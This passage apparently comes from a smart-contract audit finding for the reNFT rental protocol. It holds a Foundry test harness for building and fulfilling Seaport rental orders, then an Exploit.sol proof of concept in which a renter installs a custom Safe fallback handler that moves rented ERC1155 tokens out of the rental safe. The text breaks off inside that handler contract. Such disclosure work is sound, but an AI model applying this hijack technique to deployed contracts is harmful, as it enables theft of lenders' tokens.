.withSignature(signature);\n            }\n        }\n\n        function _signSeaportOrder(\n            uint256 signerPrivateKey,\n            bytes32 orderHash\n        ) private view returns (bytes memory signature) {\n            // fetch domain separator from seaport\n            (, bytes32 domainSeparator, ) = seaport.information();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(orderHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                               Order Amendments                              //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function resetOrderToCreate() internal {\n            delete orderToCreate;\n        }\n\n        function withOfferer(ProtocolAccount memory _offerer) internal {\n            orderToCreate.offerer = _offerer;\n        }\n\n        function resetOfferer() internal {\n            delete orderToCreate.offerer;\n        }\n\n        function withReplacedOfferItems(OfferItem[] memory _offerItems) internal {\n            // reset all current offer items\n            resetOfferItems();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < _offerItems.length; i++) {\n                orderToCreate.offerItems.push(_offerItems[i]);\n            }\n        }\n\n        function withOfferItem(OfferItem memory offerItem) internal {\n            orderToCreate.offerItems.push(offerItem);\n        }\n\n        function resetOfferItems() internal {\n            delete orderToCreate.offerItems;\n        }\n\n        function popOfferItem() internal {\n            orderToCreate.offerItems.pop();\n        }\n\n        function withReplacedConsiderationItems(\n            ConsiderationItem[] memory _considerationItems\n        ) internal {\n            // reset all current consideration items\n            resetConsiderationItems();\n\n            // add the new consideration items to storage\n            for (uint256 i = 0; i < _considerationItems.length; i++) {\n                orderToCreate.considerationItems.push(_considerationItems[i]);\n            }\n        }\n\n        function withConsiderationItem(ConsiderationItem memory considerationItem) internal {\n            orderToCreate.considerationItems.push(considerationItem);\n        }\n\n        function resetConsiderationItems() internal {\n            delete orderToCreate.considerationItems;\n        }\n\n        function popConsiderationItem() internal {\n            orderToCreate.considerationItems.pop();\n        }\n\n        function withHooks(Hook[] memory hooks) internal {\n            // delete the current metatdata hooks\n            delete orderToCreate.metadata.hooks;\n\n            // add each metadata hook to storage\n            for (uint256 i = 0; i < hooks.length; i++) {\n                orderToCreate.metadata.hooks.push(hooks[i]);\n            }\n        }\n\n        function withOrderMetadata(OrderMetadata memory _metadata) internal {\n            // update the static metadata parameters\n            orderToCreate.metadata.orderType = _metadata.orderType;\n            orderToCreate.metadata.rentDuration = _metadata.rentDuration;\n            orderToCreate.metadata.emittedExtraData = _metadata.emittedExtraData;\n\n            // update the hooks\n            withHooks(_metadata.hooks);\n        }\n\n        function resetOrderMetadata() internal {\n            delete orderToCreate.metadata;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                              Order Finalization                             //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function finalizeOrder()\n            internal\n            returns (Order memory, bytes32, OrderMetadata memory)\n        {\n            // create and sign the order\n            (Order memory order, bytes32 orderHash) = _createSignedOrder(\n                orderToCreate.offerer,\n                orderToCreate.offerItems,\n                orderToCreate.considerationItems,\n                orderToCreate.metadata\n            );\n\n            // pull order metadata into memory\n            OrderMetadata memory metadata = orderToCreate.metadata;\n\n            // clear structs\n            resetOrderToCreate();\n\n            return (order, orderHash, metadata);\n        }\n    }\n\n\n    // Sets up logic in the test engine related to order fulfillment\n    // Borrowed from test/fixtures/engine/OrderFulfiller\n    contract OrderFulfiller is OrderCreator {\n        using ECDSA for bytes32;\n\n        struct OrderToFulfill {\n            bytes32 orderHash;\n            RentPayload payload;\n            AdvancedOrder advancedOrder;\n        }\n\n        // components of a fulfillment\n        ProtocolAccount fulfiller;\n        OrderToFulfill[] ordersToFulfill;\n        Fulfillment[] seaportMatchOrderFulfillments;\n        FulfillmentComponent[][] seaportOfferFulfillments;\n        FulfillmentComponent[][] seaportConsiderationFulfillments;\n        address seaportRecipient;\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                             Fulfillment Creation                            //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order fulfillment\n        function createOrderFulfillment(\n            ProtocolAccount memory _fulfiller,\n            Order memory order,\n            bytes32 orderHash,\n            OrderMetadata memory metadata\n        ) internal {\n            // set the fulfiller account\n            fulfiller = _fulfiller;\n\n            // set the recipient of any offer items after an order is fulfilled. If the fulfillment is via\n            // `matchAdvancedOrders`, then any unspent offer items will go to this address as well\n            seaportRecipient = address(_fulfiller.safe);\n\n            // get a pointer to a new order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill.push();\n\n            // create an order fulfillment\n            OrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));\n\n            // add the order hash and fulfiller\n            orderToFulfill.orderHash = orderHash;\n\n            // create rental zone payload data\n            _createRentalPayload(\n                orderToFulfill.payload,\n                RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr)\n            );\n\n            // generate the signature for the payload\n            bytes memory signature = _signProtocolOrder(\n                rentalSigner.privateKey,\n                create.getRentPayloadHash(orderToFulfill.payload)\n            );\n\n            // create an advanced order from the order. Pass the rental\n            // payload as extra data\n            _createAdvancedOrder(\n                orderToFulfill.advancedOrder,\n                AdvancedOrder(\n                    order.parameters,\n                    1,\n                    1,\n                    order.signature,\n                    abi.encode(orderToFulfill.payload, signature)\n                )\n            );\n        }\n\n        function _createOrderFulfiller(\n            ProtocolAccount storage storageFulfiller,\n            ProtocolAccount memory _fulfiller\n        ) private {\n            storageFulfiller.addr = _fulfiller.addr;\n            storageFulfiller.safe = _fulfiller.safe;\n            storageFulfiller.publicKeyX = _fulfiller.publicKeyX;\n            storageFulfiller.publicKeyY = _fulfiller.publicKeyY;\n            storageFulfiller.privateKey = _fulfiller.privateKey;\n        }\n\n        function _createOrderFulfillment(\n            OrderFulfillment storage storageFulfillment,\n            OrderFulfillment memory fulfillment\n        ) private {\n            storageFulfillment.recipient = fulfillment.recipient;\n        }\n\n        function _createOrderMetadata(\n            OrderMetadata storage storageMetadata,\n            OrderMetadata memory metadata\n        ) private {\n            // Create order metadata in storage\n            storageMetadata.orderType = metadata.orderType;\n            storageMetadata.rentDuration = metadata.rentDuration;\n            storageMetadata.emittedExtraData = metadata.emittedExtraData;\n\n            // dynamically push the hooks from memory to storage\n            for (uint256 i = 0; i < metadata.hooks.length; i++) {\n                storageMetadata.hooks.push(metadata.hooks[i]);\n            }\n        }\n\n        function _createRentalPayload(\n            RentPayload storage storagePayload,\n            RentPayload memory payload\n        ) private {\n            // set payload fulfillment on the order to fulfill\n            _createOrderFulfillment(storagePayload.fulfillment, payload.fulfillment);\n\n            // set payload metadata on the order to fulfill\n            _createOrderMetadata(storagePayload.metadata, payload.metadata);\n\n            // set payload expiration on the order to fulfill\n            storagePayload.expiration = payload.expiration;\n\n            // set payload intended fulfiller on the order to fulfill\n            storagePayload.intendedFulfiller = payload.intendedFulfiller;\n        }\n\n        function _createAdvancedOrder(\n            AdvancedOrder storage storageAdvancedOrder,\n            AdvancedOrder memory advancedOrder\n        ) private {\n            // create the order parameters on the order to fulfill\n            _createOrderParameters(storageAdvancedOrder.parameters, advancedOrder.parameters);\n\n            // create the rest of the static parameters on the order to fulfill\n            storageAdvancedOrder.numerator = advancedOrder.numerator;\n            storageAdvancedOrder.denominator = advancedOrder.denominator;\n            storageAdvancedOrder.signature = advancedOrder.signature;\n            storageAdvancedOrder.extraData = advancedOrder.extraData;\n        }\n\n        function _createOrderParameters(\n            OrderParameters storage storageOrderParameters,\n            OrderParameters memory orderParameters\n        ) private {\n            // create the static order parameters for the order to fulfill\n            storageOrderParameters.offerer = orderParameters.offerer;\n            storageOrderParameters.zone = orderParameters.zone;\n            storageOrderParameters.orderType = orderParameters.orderType;\n            storageOrderParameters.startTime = orderParameters.startTime;\n            storageOrderParameters.endTime = orderParameters.endTime;\n            storageOrderParameters.zoneHash = orderParameters.zoneHash;\n            storageOrderParameters.salt = orderParameters.salt;\n            storageOrderParameters.conduitKey = orderParameters.conduitKey;\n            storageOrderParameters.totalOriginalConsiderationItems = orderParameters\n                .totalOriginalConsiderationItems;\n\n            // create the dynamic order parameters for the order to fulfill\n            for (uint256 i = 0; i < orderParameters.offer.length; i++) {\n                storageOrderParameters.offer.push(orderParameters.offer[i]);\n            }\n            for (uint256 i = 0; i < orderParameters.consideration.length; i++) {\n                storageOrderParameters.consideration.push(orderParameters.consideration[i]);\n            }\n        }\n\n        function _createSeaportFulfillment(\n            Fulfillment storage storageFulfillment,\n            Fulfillment memory fulfillment\n        ) private {\n            // push the offer components to storage\n            for (uint256 i = 0; i < fulfillment.offerComponents.length; i++) {\n                storageFulfillment.offerComponents.push(fulfillment.offerComponents[i]);\n            }\n\n            // push the consideration components to storage\n            for (uint256 i = 0; i < fulfillment.considerationComponents.length; i++) {\n                storageFulfillment.considerationComponents.push(\n                    fulfillment.considerationComponents[i]\n                );\n            }\n        }\n\n        function _seaportItemTypeToRentalItemType(\n            SeaportItemType seaportItemType\n        ) internal pure returns (RentalItemType) {\n            if (seaportItemType == SeaportItemType.ERC20) {\n                return RentalItemType.ERC20;\n            } else if (seaportItemType == SeaportItemType.ERC721) {\n                return RentalItemType.ERC721;\n            } else if (seaportItemType == SeaportItemType.ERC1155) {\n                return RentalItemType.ERC1155;\n            } else {\n                revert(\"seaport item type not supported\");\n            }\n        }\n\n        function _createRentalOrder(\n            OrderToFulfill memory orderToFulfill\n        ) internal view returns (RentalOrder memory rentalOrder) {\n            // get the order parameters\n            OrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;\n\n            // get the payload\n            RentPayload memory payload = orderToFulfill.payload;\n\n            // get the metadata\n            OrderMetadata memory metadata = payload.metadata;\n\n            // construct a rental order\n            rentalOrder = RentalOrder({\n                seaportOrderHash: orderToFulfill.orderHash,\n                items: new Item[](parameters.offer.length + parameters.consideration.length),\n                hooks: metadata.hooks,\n                orderType: metadata.orderType,\n                lender: parameters.offerer,\n                renter: payload.intendedFulfiller,\n                rentalWallet: payload.fulfillment.recipient,\n                startTimestamp: block.timestamp,\n                endTimestamp: block.timestamp + metadata.rentDuration\n            });\n\n            // for each new offer item being rented, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.offer.length; i++) {\n                // PAYEE orders cannot have offer items\n                require(\n                    metadata.orderType != OrderType.PAYEE,\n                    \"TEST: cannot have offer items in PAYEE order\"\n                );\n\n                // get the offer item\n                OfferItem memory offerItem = parameters.offer[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // create a new rental item\n                rentalOrder.items[i] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: offerItem.token,\n                    amount: offerItem.startAmount,\n                    identifier: offerItem.identifierOrCriteria\n                });\n            }\n\n            // for each consideration item in return, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.consideration.length; i++) {\n                // PAY orders cannot have consideration items\n                require(\n                    metadata.orderType != OrderType.PAY,\n                    \"TEST: cannot have consideration items in PAY order\"\n                );\n\n                // get the offer item\n                ConsiderationItem memory considerationItem = parameters.consideration[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(\n                    considerationItem.itemType\n                );\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = metadata.orderType == OrderType.PAYEE &&\n                    considerationItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // calculate item index offset\n                uint256 itemIndex = i + parameters.offer.length;\n\n                // create a new payment item\n                rentalOrder.items[itemIndex] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: considerationItem.token,\n                    amount: considerationItem.startAmount,\n                    identifier: considerationItem.identifierOrCriteria\n                });\n            }\n        }\n\n        function _signProtocolOrder(\n            uint256 signerPrivateKey,\n            bytes32 payloadHash\n        ) internal view returns (bytes memory signature) {\n            // fetch domain separator from create policy\n            bytes32 domainSeparator = create.domainSeparator();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(payloadHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                            Fulfillment Amendments                           //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function withFulfiller(ProtocolAccount memory _fulfiller) internal {\n            fulfiller = _fulfiller;\n        }\n\n        function withRecipient(address _recipient) internal {\n            seaportRecipient = _recipient;\n        }\n\n        function withAdvancedOrder(\n            AdvancedOrder memory _advancedOrder,\n            uint256 orderIndex\n        ) internal {\n            // get a storage pointer to the order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill[orderIndex];\n\n            // set the new advanced order\n            _createAdvancedOrder(orderToFulfill.advancedOrder, _advancedOrder);\n        }\n\n        function withSeaportMatchOrderFulfillment(Fulfillment memory _fulfillment) internal {\n            // get a pointer to a new seaport fulfillment\n            Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n            // set the fulfillment\n            _createSeaportFulfillment(\n                fulfillment,\n                Fulfillment({\n                    offerComponents: _fulfillment.offerComponents,\n                    considerationComponents: _fulfillment.considerationComponents\n                })\n            );\n        }\n\n        function withSeaportMatchOrderFulfillments(\n            Fulfillment[] memory fulfillments\n        ) internal {\n            // reset all current seaport match order fulfillments\n            resetSeaportMatchOrderFulfillments();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < fulfillments.length; i++) {\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: fulfillments[i].offerComponents,\n                        considerationComponents: fulfillments[i].considerationComponents\n                    })\n                );\n            }\n        }\n\n        function withBaseOrderFulfillmentComponents() internal {\n            // create offer fulfillments. We need to specify which offer items can be aggregated\n            // into one transaction. For example, 2 different orders where the same seller is offering\n            // the same item in each.\n            //\n            // Since BASE orders will only contain ERC721 offer items, these cannot be aggregated. So, a separate fulfillment\n            // is created for each order.\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                // get a pointer to a new offer fulfillment array. This array will contain indexes of\n                // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n                FulfillmentComponent[] storage offerFulfillments = seaportOfferFulfillments\n                    .push();\n\n                // number of offer items in the order\n                uint256 offerItemsInOrder = ordersToFulfill[i]\n                    .advancedOrder\n                    .parameters\n                    .offer\n                    .length;\n\n                // add a single fulfillment component for each offer item in the order\n                for (uint256 j = 0; j < offerItemsInOrder; j++) {\n                    offerFulfillments.push(\n                        FulfillmentComponent({orderIndex: i, itemIndex: j})\n                    );\n                }\n            }\n\n            // create consideration fulfillments. We need to specify which consideration items can be aggregated\n            // into one transaction. For example, 3 different orders where the same fungible consideration items are\n            // expected in return.\n            //\n            // get a pointer to a new offer fulfillment array. This array will contain indexes of\n            // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n            FulfillmentComponent[]\n                storage considerationFulfillments = seaportConsiderationFulfillments.push();\n\n            // BASE orders will only contain ERC20 items, these are fungible and are candidates for aggregation. Because\n            // all of these BASE orders will be fulfilled by the same EOA, and all ERC20 consideration items are going to the\n            // ESCRW contract, the consideration items can be aggregated. In other words, Seaport will only make a single transfer\n            // of ERC20 tokens from the fulfiller EOA to the payment escrow contract.\n            //\n            // put all fulfillments into one which can be an aggregated transfer\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                considerationFulfillments.push(\n                    FulfillmentComponent({orderIndex: i, itemIndex: 0})\n                );\n            }\n        }\n\n        function withLinkedPayAndPayeeOrders(\n            uint256 payOrderIndex,\n            uint256 payeeOrderIndex\n        ) internal {\n            // get the PAYEE order\n            OrderParameters memory payeeOrder = ordersToFulfill[payeeOrderIndex]\n                .advancedOrder\n                .parameters;\n\n            // For each consideration item in the PAYEE order, a fulfillment should be\n            // constructed with a corresponding item from the PAY order's offer items.\n            for (uint256 i = 0; i < payeeOrder.consideration.length; ++i) {\n                // define the offer components\n                FulfillmentComponent[] memory offerComponents = new FulfillmentComponent[](1);\n                offerComponents[0] = FulfillmentComponent({\n                    orderIndex: payOrderIndex,\n                    itemIndex: i\n                });\n\n                // define the consideration components\n                FulfillmentComponent[]\n                    memory considerationComponents = new FulfillmentComponent[](1);\n                considerationComponents[0] = FulfillmentComponent({\n                    orderIndex: payeeOrderIndex,\n                    itemIndex: i\n                });\n\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: offerComponents,\n                        considerationComponents: considerationComponents\n                    })\n                );\n            }\n        }\n\n        function resetFulfiller() internal {\n            delete fulfiller;\n        }\n\n        function resetOrdersToFulfill() internal {\n            delete ordersToFulfill;\n        }\n\n        function resetSeaportMatchOrderFulfillments() internal {\n            delete seaportMatchOrderFulfillments;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                           Fulfillment Finalization                          //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function _finalizePayOrderFulfillment(\n            bytes memory expectedError\n        )\n            private\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            // get the orders to fulfill\n            OrderToFulfill memory payOrder = ordersToFulfill[0];\n            OrderToFulfill memory payeeOrder = ordersToFulfill[1];\n\n            // create rental orders\n            payRentalOrder = _createRentalOrder(payOrder);\n            payeeRentalOrder = _createRentalOrder(payeeOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(payRentalOrder),\n                    payOrder.payload.metadata.emittedExtraData,\n                    payRentalOrder.seaportOrderHash,\n                    payRentalOrder.items,\n                    payRentalOrder.hooks,\n                    payRentalOrder.orderType,\n                    payRentalOrder.lender,\n                    payRentalOrder.renter,\n                    payRentalOrder.rentalWallet,\n                    payRentalOrder.startTimestamp,\n                    payRentalOrder.endTimestamp\n                );\n            }\n\n            // the offerer of the PAYEE order fulfills the orders.\n            vm.prank(fulfiller.addr);\n\n            // fulfill the orders\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrderFulfillment()\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizePayOrderFulfillmentWithError(\n            bytes memory expectedError\n        )\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(expectedError);\n        }\n\n        function _finalizeBaseOrderFulfillment(\n            bytes memory expectedError\n        ) private returns (RentalOrder memory rentalOrder) {\n            // get the order to fulfill\n            OrderToFulfill memory baseOrder = ordersToFulfill[0];\n\n            // create a rental order\n            rentalOrder = _createRentalOrder(baseOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrder),\n                    baseOrder.payload.metadata.emittedExtraData,\n                    rentalOrder.seaportOrderHash,\n                    rentalOrder.items,\n                    rentalOrder.hooks,\n                    rentalOrder.orderType,\n                    rentalOrder.lender,\n                    rentalOrder.renter,\n                    rentalOrder.rentalWallet,\n                    rentalOrder.startTimestamp,\n                    rentalOrder.endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced order, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAdvancedOrder(\n                baseOrder.advancedOrder,\n                new CriteriaResolver[](0),\n                conduitKey,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizeBaseOrderFulfillment()\n            internal\n            returns (RentalOrder memory rentalOrder)\n        {\n            rentalOrder = _finalizeBaseOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizeBaseOrderFulfillmentWithError(\n            bytes memory expectedError\n        ) internal returns (RentalOrder memory rentalOrder) {\n            rentalOrder = _finalizeBaseOrderFulfillment(expectedError);\n        }\n\n        function finalizeBaseOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrders[i]),\n                    ordersToFulfill[i].payload.metadata.emittedExtraData,\n                    rentalOrders[i].seaportOrderHash,\n                    rentalOrders[i].items,\n                    rentalOrders[i].hooks,\n                    rentalOrders[i].orderType,\n                    rentalOrders[i].lender,\n                    rentalOrders[i].renter,\n                    rentalOrders[i].rentalWallet,\n                    rentalOrders[i].startTimestamp,\n                    rentalOrders[i].endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced orders, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAvailableAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportOfferFulfillments,\n                seaportConsiderationFulfillments,\n                conduitKey,\n                seaportRecipient,\n                ordersToFulfill.length\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                // only expect the event if its a PAY order\n                if (ordersToFulfill[i].payload.metadata.orderType == OrderType.PAY) {\n                    vm.expectEmit({emitter: address(create)});\n                    emit Events.RentalOrderStarted(\n                        create.getRentalOrderHash(rentalOrders[i]),\n                        ordersToFulfill[i].payload.metadata.emittedExtraData,\n                        rentalOrders[i].seaportOrderHash,\n                        rentalOrders[i].items,\n                        rentalOrders[i].hooks,\n                        rentalOrders[i].orderType,\n                        rentalOrders[i].lender,\n                        rentalOrders[i].renter,\n                        rentalOrders[i].rentalWallet,\n                        rentalOrders[i].startTimestamp,\n                        rentalOrders[i].endTimestamp\n                    );\n                }\n            }\n\n            // the offerer of the PAYEE order fulfills the orders. For this order, it shouldn't matter\n            // what the recipient address is\n            vm.prank(fulfiller.addr);\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function _deconstructOrdersToFulfill()\n            private\n            view\n            returns (AdvancedOrder[] memory advancedOrders)\n        {\n            // get the length of the orders to fulfill\n            advancedOrders = new AdvancedOrder[](ordersToFulfill.length);\n\n            // build up the advanced orders\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                advancedOrders[i] = ordersToFulfill[i].advancedOrder;\n            }\n        }\n    }\n\n    contract SetupReNFT is OrderFulfiller {}\n\n</details>\n\n<details>\n<summary><b>Exploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        Order,\n        FulfillmentComponent,\n        Fulfillment,\n        ItemType as SeaportItemType\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n\n    import {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStructs.sol\";\n\n    import {SetupReNFT} from \"./SetupExploit.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n    import \"forge-std/console.sol\";\n\n\n\n    contract Exploit is SetupReNFT, Assertions, Constants {\n\n        function test_ERC1155_Exploit() public {\n\n            // Impersonate the attacker\n            vm.startPrank(attacker.addr);\n\n            // The custom fallback handler the attacker created.\n            CustomFallbackHandler customFallbackHandler = new CustomFallbackHandler(attacker.addr);\n\n            // Set the attacker's safe address on the fallback handler which the fallback handler will communicate with.\n            customFallbackHandler.setSafeAddr(address(attacker.safe));\n\n            // Set the address of the token which the attacker wants to hijack on the fallback handler.\n            customFallbackHandler.setTokenToHijackAddr(address(erc1155s[0]));\n\n            // The `setFallbackHandler` TX\n            bytes memory transaction = abi.encodeWithSelector(\n                Safe.setFallbackHandler.selector,\n                address(customFallbackHandler)\n            );\n\n            // The signature of the `setFallbackHandler` TX\n            bytes memory transactionSignature = SafeUtils.signTransaction(\n                address(attacker.safe),\n                attacker.privateKey,\n                address(attacker.safe),\n                transaction\n            );\n\n            // Execute the transaction on attacker's safe\n            SafeUtils.executeTransaction(\n                address(attacker.safe),\n                address(attacker.safe),\n                transaction,\n                transactionSignature\n            );\n\n\n\n            // The malicious TX which the custom fallback handler will execute when `onERC1155Received` is called.\n            bytes memory hijackTX = abi.encodeWithSignature(\n                \"safeTransferFrom(address,address,uint256,uint256,bytes)\",\n                address(attacker.safe),\n                address(attacker.addr),\n                0,\n                100,\n                \"\"\n            );\n\n\n            // Get the signature of the malicious TX.\n            transactionSignature = SafeUtils.signTransaction(\n                address(attacker.safe),\n                attacker.privateKey,\n                address(address(erc1155s[0])),\n                hijackTX\n            );\n\n\n            // Set the malicious TX and it's signature on the custom fallback handler contract so that it sends it\n            customFallbackHandler.setSignatureAndTransaction(transactionSignature, hijackTX);\n\n            vm.stopPrank();\n\n            /////////////////////////////////////////////\n            // Order Creation & Fulfillment simulation //\n            /////////////////////////////////////////////\n\n            // Alice creates a BASE order\n            createOrder({\n                offerer: alice,\n                orderType: OrderType.BASE,\n                erc721Offers: 0,\n                erc1155Offers: 1,\n                erc20Offers: 0,\n                erc721Considerations: 0,\n                erc1155Considerations: 0,\n                erc20Considerations: 1\n            });\n\n            // Finalize the order creation\n            (\n                Order memory order,\n                bytes32 orderHash,\n                OrderMetadata memory metadata\n            ) = finalizeOrder();\n            \n\n            // Create an order fulfillment\n            createOrderFulfillment({\n                _fulfiller: attacker,\n                order: order,\n                orderHash: orderHash,\n                metadata: metadata\n            });\n\n            // Finalize the base order fulfillment\n            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();\n\n            // get the rental order hash\n            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);\n\n            ////////////////////////////\n            // Token Theft Proof      //\n            ////////////////////////////\n\n            uint256 attackersBalance = erc1155s[0].balanceOf(address(attacker.addr), 0);\n            uint256 attackersSafeBalance = erc1155s[0].balanceOf(address(attacker.safe), 0);\n\n            if (attackersSafeBalance == uint256(0) && attackersBalance == uint256(100)) {\n                console.log(\"Tokens successfully hijacked from the attacker's (borrower) safe!\");\n            }\n\n            // Assert that the rental order was stored\n            assertEq(STORE.orders(rentalOrderHash), true);\n\n            // Assert that the token is in storage\n            assertEq(STORE.isRentedOut(address(attacker.safe), address(erc1155s[0]), 0), true);\n\n            // assert that the fulfiller made a payment\n            assertEq(erc20s[0].balanceOf(attacker.addr), uint256(9900));\n\n            // assert that a payment was made to the escrow contract\n            assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));\n\n            // assert that a payment was synced properly in the escrow contract\n            assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));\n\n        }\n\n    }\n\n\n    interface Safe {\n        function execTransaction(\n            address to,\n            uint256 value,\n            bytes calldata data,\n            Enum.Operation operation,\n            uint256 safeTxGas,\n            uint256 baseGas,\n            uint256 gasPrice,\n            address gasToken,\n            address payable refundReceiver,\n            bytes memory signatures\n        ) external payable returns (bool success);\n\n        function setFallbackHandler(address handler) external;\n\n        function addOwnerWithThreshold(address owner, uint256 threshold) external;\n    }\n\n\n    contract CustomFallbackHandler {\n\n        address private owner; // The address of the attacker.\n        address private safe; // The address of the attacker's safe.\n        address private tokenToHijack; // The address of the token which the attacker wants to hijack.\n        bytes maliciousSafeTransactionSignature; // Signature needed for the Safe TX.\n        bytes maliciousSafeTransaction; // The transaction sent to the attacker's safe which will hijack the token\n\n        constructor(address _owner) {\n            owner = _owner;\n        }\n\n        function 